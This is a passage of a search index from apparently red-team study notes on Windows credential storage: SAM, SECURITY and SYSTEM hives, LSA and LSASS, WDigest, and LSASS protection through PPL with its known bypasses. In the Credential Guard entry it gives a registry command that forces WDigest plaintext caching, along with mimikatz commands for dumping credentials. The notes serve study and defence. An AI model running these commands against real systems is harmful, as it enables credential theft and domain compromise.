Local Security Authority (LSA) needs a secure store to record: system-wide cryptographic secrets sensitive policy data service account credentials secret keys If this hive is missing → LSA cannot decrypt anything → all authentication breaks."},{"id":"how-these-hives-work-together-crypto-flow","u":"00_things-to-understand-prior.html#how-these-hives-work-together-crypto-flow","sec":"Things To Understand Prior","lvl":3,"t":"🧠 6. How These Hives Work Together (Crypto Flow)","c":"SYSTEM hive creates the BootKey ↓ BootKey decrypts: SAM Key in SAM hive LSA Key in SECURITY hive ↓ SAM Key decrypts user password hashes (then RID-based DES decryption yields final NT hashes) ↓ LSA Key decrypts stored secrets This is a layered security architecture."},{"id":"are-these-hives-present-on-all-systems-yes","u":"00_things-to-understand-prior.html#are-these-hives-present-on-all-systems-yes","sec":"Things To Understand Prior","lvl":3,"t":"🔥 7. ARE THESE HIVES PRESENT ON ALL SYSTEMS? (YES!)","c":"Machine Type | SYSTEM | SAM | SECURITY | — | — | — | — | Standalone Windows | ✔ | ✔ | ✔ | Workgroup Windows | ✔ | ✔ | ✔ | Domain-joined Windows (Member Machine) | ✔ | ✔ | ✔ | Domain Controller (AD DS) | ✔ | ✔ | ✔ | Every Windows machine has all 3 hives. They are built-in core OS components."},{"id":"then-why-do-domain-controllers-also-have-a-sam","u":"00_things-to-understand-prior.html#then-why-do-domain-controllers-also-have-a-sam","sec":"Things To Understand Prior","lvl":3,"t":"🏛️ 8. Then why do Domain Controllers also have a SAM?","c":"DCs store domain credentials in: NTDS.dit NOT in the SAM hive. However, DCs STILL USE SAM for: ✔ 1. Local system accounts (different from domain accounts) Administrator (RID 500) LocalSystem LocalService NetworkService These exist even on DCs. ✔ 2. Boot-time authentication Before NTDS initializes, Windows still uses SAM for: system startup processes recovery mode / DSRM (Directory Services Restore Mode) ✔ 3. Offline repair mode DSRM password is the password for the DSRM Administrator account → stored in SAM, not NTDS. ✔ 4. LSA still needs SAM for local policies Active Directory doesn’t replace the local security subsystem. 🔥 So even DCs cannot get rid of SAM."},{"id":"do-domain-joined-workstations-still-use-sam","u":"00_things-to-understand-prior.html#do-domain-joined-workstations-still-use-sam","sec":"Things To Understand Prior","lvl":3,"t":"🧪 9. Do Domain-Joined Workstations Still Use SAM?","c":"YES. Absolutely. They authenticate: Local accounts (local admin, local users) Machine account passwords (machine$) Services running as local accounts When a user logs in with a domain account , the credential verification happens using the domain controller — NTDS.dit. But the machine STILL uses SAM to store: the machine account password local users system accounts"},{"id":"so-a-domain-joined-machine-has-2-credential-ecosystems","u":"00_things-to-understand-prior.html#so-a-domain-joined-machine-has-2-credential-ecosystems","sec":"Things To Understand Prior","lvl":3,"t":"So a domain-joined machine has 2 credential ecosystems:","c":"Purpose | Where Stored | — | — | Local accounts | SAM hive | Domain accounts | NTDS.dit on DC | Cached domain logins | SECURITY hive (MSV1_0 cache) |"},{"id":"why-windows-didnt-move-everything-to-ntds.dit","u":"00_things-to-understand-prior.html#why-windows-didnt-move-everything-to-ntds.dit","sec":"Things To Understand Prior","lvl":3,"t":"🧨 10. Why Windows Didn’t Move Everything to NTDS.dit?","c":"Because: ✔ NTDS.dit exists ONLY on Domain Controllers ✔ Workstations and member servers must still function without AD (offline login) ✔ Local accounts are needed for: system boot safe mode recovery local services fallback admin access Windows architecture relies on local security even inside a domain."},{"id":"master-summary-super-clean","u":"00_things-to-understand-prior.html#master-summary-super-clean","sec":"Things To Understand Prior","lvl":3,"t":"⚡ MASTER SUMMARY (Super Clean)","c":"Hive | Where Stored | Purpose | Always Present? | Domain Use? | — | — | — | — | — | SYSTEM | Config| BootKey, config | ✔ | Needed to decrypt SAM + SECURITY | SAM | Config| Local user hashes | ✔ | Domain-joined machines still use SAM for local users + machine accounts | SECURITY | Config| LSA secrets | ✔ | Used even on domain systems for secrets + cached creds | NTDS.dit (DC Only) | C:\\Windows\\NTDS\\NTDS.dit | Domain user database | ❌ (DC only) | Domain accounts |"},{"id":"lssas-lsa","u":"00_things-to-understand-prior.html#lssas-lsa","sec":"Things To Understand Prior","lvl":2,"t":"Lssas & LSA","c":""},{"id":"understanding-lsass-lsa-wdigest","u":"00_things-to-understand-prior.html#understanding-lsass-lsa-wdigest","sec":"Things To Understand Prior","lvl":3,"t":"Understanding Lsass + Lsa + Wdigest","c":""},{"id":"what-is-lsa","u":"00_things-to-understand-prior.html#what-is-lsa","sec":"Things To Understand Prior","lvl":3,"t":"✅ 1. What is LSA?","c":"LSA = Local Security Authority LSA is a Windows security subsystem responsible for: Authentication Authorization Local Security Policy Token generation Password validation SID ↔︎ Username mapping Credential management (via packages) LSA is a set of DLLs & internal APIs , NOT a process. Key DLLs LSA loads internally: Component | Purpose | — | — | lsasrv.dll | Core security authority (auth, tokens, policy) | msv1_0.dll | NTLM authentication package | kerberos.dll | Kerberos authentication package | tspkg.dll | Terminal Services auth | wdigest.dll | WDigest authentication (historically stored plaintext) | lsadb.dll | Stores LSA secrets | Important: LSA is responsible for everything; LSASS is simply the process running LSA code."},{"id":"what-is-lsass","u":"00_things-to-understand-prior.html#what-is-lsass","sec":"Things To Understand Prior","lvl":3,"t":"✅ 2. What is LSASS?","c":"LSASS = Local Security Authority Subsystem Service This is the process running LSA. Process name: lsass.exe Location: C:\\Windows\\System32\\lsass.exe Runs as SYSTEM Protected by PPL (Protected Process Light) on modern Windows LSASS: Hosts LSA Holds all sensitive credential material in memory Communicates with SAM, SECURITY, SYSTEM hives Generates & manages tokens Stores Kerberos tickets, cached NTLM hashes, DPAPI master keys Stores plaintext passwords under certain conditions"},{"id":"difference-lsa-vs-lsass-super-clear","u":"00_things-to-understand-prior.html#difference-lsa-vs-lsass-super-clear","sec":"Things To Understand Prior","lvl":3,"t":"✅ 3. DIFFERENCE: LSA vs LSASS (super clear)","c":"Feature | LSA | LSASS | — | — | — | Type | Subsystem / architecture | Actual running process | Exists as | API + DLLs | lsass.exe | Role | Implements authentication logic | Executes LSA logic & holds credentials in RAM | Stores secrets | Conceptually yes (LSA secrets) | Actually holds them in memory | Dump target | No | Yes (Mimikatz, PPL bypasses) | In simple terms: ⮞ LSA is the brain. ⮞ LSASS is the body that runs the brain. ⮞ Attackers dump LSASS because the secrets exist in RAM inside LSASS."},{"id":"does-lsass-store-cached-passwords","u":"00_things-to-understand-prior.html#does-lsass-store-cached-passwords","sec":"Things To Understand Prior","lvl":3,"t":"✅ 4. Does LSASS store cached passwords?","c":"Yes — but not “cached logon credentials” from registry. Let’s clarify:"},{"id":"lsass-stores","u":"00_things-to-understand-prior.html#lsass-stores","sec":"Things To Understand Prior","lvl":4,"t":"✔ LSASS stores:","c":"NTLM password hashes Kerberos TGT sessions / tickets WDigest plaintext passwords (if enabled) CredMan credentials (saved RDP passwords, mapped drives) DPAPI master keys LMSessionKey / NTLM Session keys Kerberos service tickets Cleartext passwords during interactive login briefly"},{"id":"lsass-does-not-store","u":"00_things-to-understand-prior.html#lsass-does-not-store","sec":"Things To Understand Prior","lvl":4,"t":"❌ LSASS does NOT store:","c":""},{"id":"ms-cache-v1v2-cached-domain-logon-hashes","u":"00_things-to-understand-prior.html#ms-cache-v1v2-cached-domain-logon-hashes","sec":"Things To Understand Prior","lvl":4,"t":"MS-Cache v1/v2 cached domain logon hashes","c":"Those are stored in registry under: HKLM\\SECURITY\\Cache Cached domain logon hashes ≠ plaintext, and LSASS does not load them into memory unless group policy / auth packages require it."},{"id":"does-lsass-store-plaintext-passwords","u":"00_things-to-understand-prior.html#does-lsass-store-plaintext-passwords","sec":"Things To Understand Prior","lvl":3,"t":"❗ Does LSASS store plaintext passwords?","c":"Yes, depending on authentication package loaded. Package | Plaintext? | Notes | — | — | — | WDigest | Yes | Disabled by default after Win8.1 but can be enabled | Kerberos | Stores session key, not password | But password may appear briefly | MSV1_0 (NTLM) | Sometimes | LSASS must derive NT hash → needs password temporarily | SSP / Cred Providers | Sometimes | RDP, RunAs, Winlogon | So plaintext appears during: interactive logon RDP logon RunAs Unlocking machine Some SSO flows After authentication, plaintext might persist in LSA memory depending on packages."},{"id":"what-lsass-100-stores-in-memory","u":"00_things-to-understand-prior.html#what-lsass-100-stores-in-memory","sec":"Things To Understand Prior","lvl":3,"t":"⭐ What LSASS 100% stores in memory","c":"NT hash of logged-on users Kerberos TGT & service tickets DPAPI Master Keys → Needed to decrypt browser creds, wifi creds LsaSecrets (machine account passwords, cached service creds) Credential Manager vault entries (saved passwords) This is why tools like: mimikatz.exe pypykatz comsvcs.dll mini dump procdump + sekurlsa are used to dump LSASS."},{"id":"cached-credentials-registry-vs-credentials-in-lsass-memory","u":"00_things-to-understand-prior.html#cached-credentials-registry-vs-credentials-in-lsass-memory","sec":"Things To Understand Prior","lvl":3,"t":"✅ 5. Cached Credentials (Registry) vs Credentials in LSASS (Memory)","c":"✔ Cached DOMAIN LOGON credentials (Registry) Location: HKLM\\SECURITY\\Cache\\NL$1 ... NL$10 Contains: MS-Cache v2 hashes Used when domain controller unavailable Not plaintext Benefit: Can log into laptop offline These DO NOT come from LSASS memory."},{"id":"credentials-lsass-stores-in-memory","u":"00_things-to-understand-prior.html#credentials-lsass-stores-in-memory","sec":"Things To Understand Prior","lvl":4,"t":"✔ Credentials LSASS stores in Memory","c":"These are “live session credentials”: password → maybe plaintext NT hash Kerberos TGT DPAPI key RDP creds Token handles Big difference: Registry cached creds: used only for domain fallback LSASS creds: used for active sessions → what Mimikatz extracts"},{"id":"what-is-wdigest","u":"00_things-to-understand-prior.html#what-is-wdigest","sec":"Things To Understand Prior","lvl":3,"t":"🔐 What is WDigest?","c":"As part of WDigest authentication provider, Windows versions up to 8 and 2012 used to store logon credentials in memory in plaintext by default, which is no longer the case with newer Windows versions. It is still possible, however, to force WDigest to store secrets in plaintext."},{"id":"wdigest-on-modern-windows-servers-2012-r2-2016-2019-2022","u":"00_things-to-understand-prior.html#wdigest-on-modern-windows-servers-2012-r2-2016-2019-2022","sec":"Things To Understand Prior","lvl":4,"t":"🔐 WDigest on Modern Windows Servers (2012 R2 / 2016 / 2019 / 2022)","c":"✅ Does WDigest Still Exist? ✔ Yes ✔ Microsoft did not remove WDigest ✔ WDigest is still loaded by LSASS as an authentication package ✔ It sits alongside: ➜ Kerberos ➜ NTLM ➜ Negotiate ➜ WDigest"},{"id":"what-changed-after-security-updates","u":"00_things-to-understand-prior.html#what-changed-after-security-updates","sec":"Things To Understand Prior","lvl":3,"t":"🚫 What Changed After Security Updates?","c":"Older Windows: ✔ User logs in ✔ LSASS stores plaintext password ✔ Credential dumping tools could recover it Modern Windows: ✔ User logs in ✔ WDigest still exists ❌ Plaintext password caching disabled by default Result: ➜ Username visible ➜ Domain visible ➜ Password often unavailable"},{"id":"can-an-administrator-re-enable-it","u":"00_things-to-understand-prior.html#can-an-administrator-re-enable-it","sec":"Things To Understand Prior","lvl":3,"t":"👨‍💼 Can An Administrator Re-Enable It?","c":"✔ Yes A local administrator can change the WDigest configuration. After enabling: ✔ Future authentication events may cause plaintext credentials to be cached again."},{"id":"important-detail-most-students-miss","u":"00_things-to-understand-prior.html#important-detail-most-students-miss","sec":"Things To Understand Prior","lvl":3,"t":"⚠ Important Detail Most Students Miss","c":"Imagine:"},{"id":"section","u":"00_things-to-understand-prior.html#section","sec":"Things To Understand Prior","lvl":4,"t":"09:00","c":"✔ User Daniel logs in WDigest plaintext caching disabled."},{"id":"section-1","u":"00_things-to-understand-prior.html#section-1","sec":"Things To Understand Prior","lvl":4,"t":"10:00","c":"✔ Administrator enables WDigest At this point: ❌ Daniel’s existing password does NOT suddenly appear in LSASS. Why? Because LSASS never stored it during the earlier login."},{"id":"what-must-happen-next","u":"00_things-to-understand-prior.html#what-must-happen-next","sec":"Things To Understand Prior","lvl":3,"t":"✅ What Must Happen Next?","c":"A fresh authentication event. Examples: ✔ User logs out and logs in again ✔ User unlocks workstation ✔ User reconnects via RDP ✔ User authenticates to Windows again Then: New Authentication ↓ WDigest Enabled ↓ Password Cached Now LSASS may contain the plaintext credential."},{"id":"is-the-password-visible-on-screen","u":"00_things-to-understand-prior.html#is-the-password-visible-on-screen","sec":"Things To Understand Prior","lvl":3,"t":"🧠 Is The Password Visible On Screen?","c":"❌ No Many beginners imagine: Username : Daniel Password : Password123 appearing somewhere. That is NOT how it works. Password is stored: ✔ Inside LSASS process memory ✔ In protected memory structures ✔ Not visible to normal users ✔ Not displayed in CMD ✔ Not displayed in Event Viewer ✔ Not displayed in Task Manager"},{"id":"why-do-attackers-care-then","u":"00_things-to-understand-prior.html#why-do-attackers-care-then","sec":"Things To Understand Prior","lvl":3,"t":"🔍 Why Do Attackers Care Then?","c":"Because if an attacker gains: ✔ Local Administrator or ✔ SYSTEM privileges they may be able to inspect LSASS memory and recover credentials that are present there."},{"id":"what-about-domain-admins","u":"00_things-to-understand-prior.html#what-about-domain-admins","sec":"Things To Understand Prior","lvl":3,"t":"🔐 What About Domain Admins?","c":"Suppose: ✔ Domain Admin logs into Server01 WDigest plaintext caching enabled. Then: Domain Admin Login ↓ LSASS ↓ Plaintext Credential Cached Now that server becomes a very attractive target. Because compromising the server could expose highly privileged credentials."},{"id":"credential-guard-changes-things","u":"00_things-to-understand-prior.html#credential-guard-changes-things","sec":"Things To Understand Prior","lvl":3,"t":"🛡️ Credential Guard Changes Things","c":"Modern enterprises often enable: Windows Defender Credential Guard Credential Guard: ✔ Isolates secrets ✔ Protects many credentials from normal LSASS dumping ✔ Makes credential theft significantly harder Now as an attacker, we can modify the following registry key to force the WDigest to store credentials in plaintext next time someone logs on to the target system: sekurlsa::wdigest image.png reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 image.png Say, now the victim on the target system spawned another shell: victim@local runas/user:mantvydaspowershell Running mimikatz for wdigest credentials now reveals the plaintext password of the victim user mantvydas : image.png"},{"id":"does-lsass-store-domain-credentials-if-the-machine-is-domain-joined","u":"00_things-to-understand-prior.html#does-lsass-store-domain-credentials-if-the-machine-is-domain-joined","sec":"Things To Understand Prior","lvl":3,"t":"❓ Does LSASS store domain credentials if the machine is domain joined?","c":"Yes. When a user logs in to a domain-joined machine: DC sends Kerberos TGT LSASS stores TGT, session key NT hash of the user is stored (not always, but usually) Machine account password is stored as an LSA secret CredMan stored entries are in LSASS memory"},{"id":"why-does-lsass-store-credentials","u":"00_things-to-understand-prior.html#why-does-lsass-store-credentials","sec":"Things To Understand Prior","lvl":3,"t":"❓ Why does LSASS store credentials?","c":"Because Windows requires:"},{"id":"single-sign-on-sso","u":"00_things-to-understand-prior.html#single-sign-on-sso","sec":"Things To Understand Prior","lvl":4,"t":"1. Single sign-on (SSO)","c":"To access SMB, LDAP, RPC, WinRM, Kerberos tickets → LSASS needs your credentials."},{"id":"token-re-creation","u":"00_things-to-understand-prior.html#token-re-creation","sec":"Things To Understand Prior","lvl":4,"t":"2. Token re-creation","c":"If your session needs to impersonate or access network resources, LSASS must re-use keys."},{"id":"dpapi","u":"00_things-to-understand-prior.html#dpapi","sec":"Things To Understand Prior","lvl":4,"t":"3. DPAPI","c":"Decrypting saved credentials & browser passwords requires DPAPI master keys → stored in LSASS."},{"id":"does-lsa-store-passwords-on-disk","u":"00_things-to-understand-prior.html#does-lsa-store-passwords-on-disk","sec":"Things To Understand Prior","lvl":3,"t":"❓ Does LSA store passwords on disk?","c":"No. Only these files contain static secrets:"},{"id":"sam-hive-local-user-password-hashes","u":"00_things-to-understand-prior.html#sam-hive-local-user-password-hashes","sec":"Things To Understand Prior","lvl":4,"t":"SAM hive → local user password hashes","c":"C:\\Windows\\System32\\config\\SAM"},{"id":"security-hive-lsa-secrets-cached-domain-creds","u":"00_things-to-understand-prior.html#security-hive-lsa-secrets-cached-domain-creds","sec":"Things To Understand Prior","lvl":4,"t":"SECURITY hive → LSA secrets + cached domain creds","c":"C:\\Windows\\System32\\config\\SECURITY"},{"id":"system-hive-bootkey-to-decrypt-sam-security","u":"00_things-to-understand-prior.html#system-hive-bootkey-to-decrypt-sam-security","sec":"Things To Understand Prior","lvl":4,"t":"SYSTEM hive → BootKey to decrypt SAM & SECURITY","c":"C:\\Windows\\System32\\config\\SYSTEM LSASS loads the decrypted content of SAM + SECURITY into memory."},{"id":"summary-extremely-clear","u":"00_things-to-understand-prior.html#summary-extremely-clear","sec":"Things To Understand Prior","lvl":3,"t":"🔥Summary (extremely clear):","c":"LSA Windows security subsystem Implements authentication logic Stores LSA secrets (conceptually) LSASS Process executing LSA Runtime memory contains: ✔ NTLM hashes ✔ Kerberos tickets ✔ Plaintext passwords (sometimes) ✔ DPAPI master keys ✔ Credential Manager entries ✔ LSA secrets"},{"id":"final-clear-answers-to-your-doubts","u":"00_things-to-understand-prior.html#final-clear-answers-to-your-doubts","sec":"Things To Understand Prior","lvl":3,"t":"👑 Final Clear Answers to Your Doubts","c":"Does LSA store cached passwords? LSA → No direct storage LSASS → Yes, keeps live credentials in memory Registry → stores cached domain password hashes Does LSASS store cached passwords? Not MS-Cache, but stores live session creds, including plaintext. Does LSASS store plaintext? Yes — depending on authentication package (e.g., WDigest, NTLM, RDP logon). Do all Windows systems use SAM/SYSTEM/SECURITY? Yes → Both domain-joined & standalone Domain joined also uses NTDS.dit on DCs (only if machine IS the domain controller)."},{"id":"protected-process-light-ppl-deep-dive","u":"00_things-to-understand-prior.html#protected-process-light-ppl-deep-dive","sec":"Things To Understand Prior","lvl":3,"t":"🔐 Protected Process Light (PPL) Deep Dive","c":"This is a very common topic in: Red Team Interviews Windows Internals Interviews Active Directory Assessments EDR Bypass Discussions"},{"id":"what-is-ppl","u":"00_things-to-understand-prior.html#what-is-ppl","sec":"Things To Understand Prior","lvl":3,"t":"📜 What is PPL?","c":"PPL (Protected Process Light) is a Windows security mechanism that prevents even highly privileged processes from opening or manipulating certain protected processes. Introduced by Microsoft to protect security-critical components such as: LSASS Credential Guard components Antivirus processes EDR processes"},{"id":"when-was-it-introduced","u":"00_things-to-understand-prior.html#when-was-it-introduced","sec":"Things To Understand Prior","lvl":3,"t":"🚀 When Was It Introduced?","c":"Windows Vista (2007) Microsoft introduced: Protected Process (PP) Used mainly for: DRM Media Protection Examples: Audio DRM Video DRM Very restrictive. Windows 8.1 / Server 2012 R2 (2013) Microsoft introduced: Protected Process Light (PPL) Purpose: Protect security products Protect LSASS Protect AV/EDR This is the version everyone refers to today when discussing LSASS protection."},{"id":"why-was-ppl-needed","u":"00_things-to-understand-prior.html#why-was-ppl-needed","sec":"Things To Understand Prior","lvl":3,"t":"🎯 Why Was PPL Needed?","c":"Before PPL: Administrator → Open LSASS → Read memory → Dump credentials Tools like: Mimikatz ProcDump Task Manager Custom malware could directly access LSASS."},{"id":"what-is-lsass-1","u":"00_things-to-understand-prior.html#what-is-lsass-1","sec":"Things To Understand Prior","lvl":3,"t":"🤔 What is LSASS?","c":"LSASS (Local Security Authority Subsystem Service) Responsible for: ✔ User Authentication ✔ Kerberos ✔ NTLM ✔ Token Creation ✔ Security Policy Enforcement What LSASS Contains After users authenticate: LSASS may contain: NTLM Data NTLM hashes Cached credentials Kerberos Data TGTs Service Tickets Access Tokens Example: User logs in → Windows creates token → LSASS tracks authentication state"},{"id":"credential-material","u":"00_things-to-understand-prior.html#credential-material","sec":"Things To Understand Prior","lvl":3,"t":"Credential Material","c":"Depending on configuration: Cached domain credentials SSP secrets Delegated credentials"},{"id":"why-attackers-love-lsass","u":"00_things-to-understand-prior.html#why-attackers-love-lsass","sec":"Things To Understand Prior","lvl":3,"t":"💀 Why Attackers Love LSASS","c":"Imagine: Domain Admin logs into server. LSASS now contains: Domain Admin TGT NTLM material Authentication tokens Attacker dumps LSASS. → Extracts credentials. → Moves laterally. →Compromises domain. This was one of the most common AD attack paths for years."},{"id":"how-ppl-protects-lsass","u":"00_things-to-understand-prior.html#how-ppl-protects-lsass","sec":"Things To Understand Prior","lvl":3,"t":"🛡️ How PPL Protects LSASS","c":"Lets see it in action on Windows Server 2012 R2. Before the change you can see I am able to dump the lsass process to a file from task manager: This file could then be used with mimikatz on or offline to extract NTLM password hashes for cached credentials. Lets make the change, and reboot: And after: Good! And if we try to run mimikatz on the server: This doesn’t offer total protection however if we can slow down our adversaries and try to stay one step ahead we are in a better place than before. Clearly if you have plugins in your environment that need to interact with the lsass process this may break things so testing is a must, there is an auditing mode highlighted here that will help identify any that fail."},{"id":"what-actually-happens-internally","u":"00_things-to-understand-prior.html#what-actually-happens-internally","sec":"Things To Understand Prior","lvl":3,"t":"🔍 What Actually Happens Internally?","c":"Every process gets a:"},{"id":"protection-level","u":"00_things-to-understand-prior.html#protection-level","sec":"Things To Understand Prior","lvl":3,"t":"Protection Level","c":"Stored in kernel structures. Examples: Process | Protection | — | — | Notepad | None | Chrome | None | LSASS (PPL Enabled) | PPL | Defender | PPL | When another process attempts: OpenProcess() ReadProcessMemory() DuplicateHandle() Kernel checks: “Is caller trusted enough?” If not: ❌ Request denied even if: Local Administrator SYSTEM in many cases."},{"id":"protection-hierarchy","u":"00_things-to-understand-prior.html#protection-hierarchy","sec":"Things To Understand Prior","lvl":3,"t":"🏗️ Protection Hierarchy","c":"Think: Normal Process → SYSTEM Process → Protected Process Light → Protected Process Higher levels can access lower levels. Lower levels cannot access higher levels."},{"id":"example-1","u":"00_things-to-understand-prior.html#example-1","sec":"Things To Understand Prior","lvl":3,"t":"Example","c":"Attacker obtains: SYSTEM Shell Without PPL: SYSTEM → Open LSASS → Read Memory Success. With PPL: SYSTEM → Open LSASS → Kernel Protection Check → Denied Failure."},{"id":"why-mimikatz-suddenly-stopped-working","u":"00_things-to-understand-prior.html#why-mimikatz-suddenly-stopped-working","sec":"Things To Understand Prior","lvl":3,"t":"Why Mimikatz Suddenly “Stopped Working”","c":"Years ago: Admin → Run Mimikatz →sekurlsa::logonpasswords → Hashes dumped Today: Admin → Run Mimikatz → LSASS is PPL → Access denied This is one of the main reasons organizations enable PPL."},{"id":"common-ppl-bypasses","u":"00_things-to-understand-prior.html#common-ppl-bypasses","sec":"Things To Understand Prior","lvl":3,"t":"🚩 Common PPL Bypasses","c":"The key idea: PPL is enforced by the Kernel Therefore: If attacker controls kernel → PPL becomes irrelevant."},{"id":"kernel-exploitation","u":"00_things-to-understand-prior.html#kernel-exploitation","sec":"Things To Understand Prior","lvl":3,"t":"1️⃣ Kernel Exploitation","c":"Concept Exploit a vulnerable kernel component. User Mode → Kernel Vulnerability → Kernel Execution → Disable PPL Why It Works Kernel is above PPL. PPL trusts the kernel. If attacker gains kernel execution: ✔ Remove protection ✔ Modify process structures ✔ Access LSASS Example Historical examples: Win32k vulnerabilities Privilege escalation bugs Such as: CVE-2021-1732 Flow: User→ Exploit Win32k→ Kernel Access → Bypass PPL → Dump LSASS"},{"id":"byovd-bring-your-own-vulnerable-driver","u":"00_things-to-understand-prior.html#byovd-bring-your-own-vulnerable-driver","sec":"Things To Understand Prior","lvl":3,"t":"2️⃣ BYOVD (Bring Your Own Vulnerable Driver)","c":"Most important modern bypass. Interview favorite. Concept Instead of exploiting Windows: Bring a vulnerable signed driver. Flow: Admin Rights → Load Vulnerable Driver→ Driver Executes In Kernel→ Disable PPL → Read LSASS Why So Powerful? Driver runs in: Ring 0 Kernel Mode PPL cannot stop kernel code. Famous Drivers Seen in Attacks Attackers abuse vulnerable drivers from: MSI ASUS Gigabyte Dell These are legitimate signed drivers. Common Tools Examples seen in red teaming: PPLKiller EDRSandblast KDU All heavily rely on driver abuse concepts."},{"id":"direct-kernel-object-manipulation-dkom","u":"00_things-to-understand-prior.html#direct-kernel-object-manipulation-dkom","sec":"Things To Understand Prior","lvl":3,"t":"3️⃣ Direct Kernel Object Manipulation (DKOM)","c":"Advanced technique. Windows stores process metadata in: EPROCESS Kernel structure. Contains: PID Token Protection Level Attacker with kernel access: Find EPROCESS → Locate Protection Field → Modify Value → LSASS no longer protected PPL removed."},{"id":"exploiting-a-trusted-ppl-process","u":"00_things-to-understand-prior.html#exploiting-a-trusted-ppl-process","sec":"Things To Understand Prior","lvl":3,"t":"4️⃣ Exploiting a Trusted PPL Process","c":"Concept: A trusted process already has permission. Instead of attacking LSASS: Attack trusted process. Example: Security Product → Code Injection Vulnerability → Execute inside trusted process→ Access LSASS Rare but possible."},{"id":"token-theft-system-access","u":"00_things-to-understand-prior.html#token-theft-system-access","sec":"Things To Understand Prior","lvl":3,"t":"5️⃣ Token Theft / SYSTEM Access","c":"⚠️ Common interview trap. Many people think: “Getting SYSTEM bypasses PPL.” This is FALSE. SYSTEM ❌ Does not automatically bypass PPL Kernel still enforces protection. SYSTEM is useful because: SYSTEM→ Load Driver → Exploit Driver → Gain Kernel → Bypass PPL SYSTEM alone ≠ PPL bypass"},{"id":"ppl-downgrade-attack","u":"00_things-to-understand-prior.html#ppl-downgrade-attack","sec":"Things To Understand Prior","lvl":3,"t":"6️⃣ PPL Downgrade Attack","c":"Goal: Convert: LSASS (PPL) ↓ LSASS (Unprotected) Requires: Kernel access or Vulnerable driver Attacker modifies protection fields. Result: Normal tools can access LSASS again."},{"id":"dma-physical-attacks","u":"00_things-to-understand-prior.html#dma-physical-attacks","sec":"Things To Understand Prior","lvl":3,"t":"7️⃣ DMA / Physical Attacks","c":"Less common. Examples: PCILeech DMA hardware Hardware device→ Direct Memory Access → Read RAM → Extract LSASS Data PPL cannot stop hardware memory reads."},{"id":"most-common-modern-real-world-bypass","u":"00_things-to-understand-prior.html#most-common-modern-real-world-bypass","sec":"Things To Understand Prior","lvl":3,"t":"📊 Most Common Modern Real-World Bypass","c":"If you’re interviewing:"},{"id":"answer","u":"00_things-to-understand-prior.html#answer","sec":"Things To Understand Prior","lvl":3,"t":"#1 Answer","c":"BYOVD Reason: Doesn’t require zero-day exploit Frequently seen in ransomware Frequently seen in APT operations Frequently used against EDRs Many modern attacks: Admin Rights → Load Vulnerable Signed Driver→ Kernel Access→ Disable PPL→ Dump LSASS"},{"id":"enabling-ppl---registry-modification-explained","u":"00_things-to-understand-prior.html#enabling-ppl---registry-modification-explained","sec":"Things To Understand Prior","lvl":3,"t":"Enabling PPL - Registry Modification Explained","c":""},{"id":"breaking-down-the-registry-path","u":"00_things-to-understand-prior.html#breaking-down-the-registry-path","sec":"Things To Understand Prior","lvl":3,"t":"Breaking Down the Registry Path","c":"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ │ ├─ HKEY_LOCAL_MACHINE (HKLM) │ └─ Registry hive on local computer │ ├─ SYSTEM │ └─ Stores hardware & kernel settings │ ├─ CurrentControlSet │ └─ Active configuration (Control Set 1, 2, or 3) │ └─ Windows uses this during boot │ ├─ Control │ └─ System control settings │ └─ Lsa └─ Local Security Authority settings (where LSASS protection configs live)"},{"id":"the-dword-entry-runasppl","u":"00_things-to-understand-prior.html#the-dword-entry-runasppl","sec":"Things To Understand Prior","lvl":3,"t":"The DWORD Entry: RunAsPPL","c":"What is it? Name: RunAsPPL Type: REG_DWORD (32-bit integer) Value: 1 = Enabled | 0 = Disabled What it Controls RunAsPPL = 1 → LSASS runs as Protected Process Light RunAsPPL = 0 → LSASS runs as normal process"},{"id":"why-it-requires-a-reboot","u":"00_things-to-understand-prior.html#why-it-requires-a-reboot","sec":"Things To Understand Prior","lvl":4,"t":"Why It Requires a Reboot","c":"The Timeline: CURRENT STATE (Before Reboot) ├─ Windows already booted ├─ LSASS.exe already running in memory ├─ Registry change made (RunAsPPL = 1) └─ But LSASS doesn't know about it yet! ↓ RESTART ↓ BOOT PROCESS (During Reboot) ├─ Windows reads registry ├─ Kernel reads HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL ├─ Sees value = 1 ├─ Loads LSASS as Protected Process Light └─ Protection now active ✓ Why Not Immediate? LSASS is a kernel-level process that starts very early in boot: 1. Registry is loaded 2. Kernel initializes 3. LSASS starts → reads RunAsPPL value 4. Kernel applies PPL protection to LSASS 5. LSASS now protected for entire session You can't change LSASS protection while it's running because: - It's a kernel-level decision - Changing process protection mode requires kernel reload - LSASS can't modify its own protection"},{"id":"how-to-make-the-change-step-by-step","u":"00_things-to-understand-prior.html#how-to-make-the-change-step-by-step","sec":"Things To Understand Prior","lvl":3,"t":"How to Make the Change (Step-by-Step)","c":"Method 1: Registry Editor GUI 1. Press Win + R 2. Type: regedit 3. Navigate: HKLM → SYSTEM → CurrentControlSet → Control → Lsa 4. Right-click in empty space → New → DWORD (32-bit) Value 5. Name it: RunAsPPL 6. Set value: 1 7. Click OK 8. Close regedit 9. Restart Computer Method 2: PowerShell (Admin) powershell # Add or modify the registry entry Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" ` -Name \"RunAsPPL\" ` -Value 1 ` -Type DWord -Force # Verify it was created Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" -Name RunAsPPL # Output should show: # RunAsPPL : 1"},{"id":"method-3-command-prompt-admin","u":"00_things-to-understand-prior.html#method-3-command-prompt-admin","sec":"Things To Understand Prior","lvl":3,"t":"Method 3: Command Prompt (Admin)","c":"cmd reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL /t REG_DWORD /d 1 /f reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL"},{"id":"what-happens-during-boot","u":"00_things-to-understand-prior.html#what-happens-during-boot","sec":"Things To Understand Prior","lvl":3,"t":"What Happens During Boot","c":"Without RunAsPPL (Normal): Boot → LSASS starts → No PPL protection → Vulnerable to attacks With RunAsPPL = 1 (Protected): Boot → Kernel reads registry → RunAsPPL = 1 → ``LSASS starts with PPL → Protection enabled → Resistant to attacks"},{"id":"registry-hive-explanation-interview-question","u":"00_things-to-understand-prior.html#registry-hive-explanation-interview-question","sec":"Things To Understand 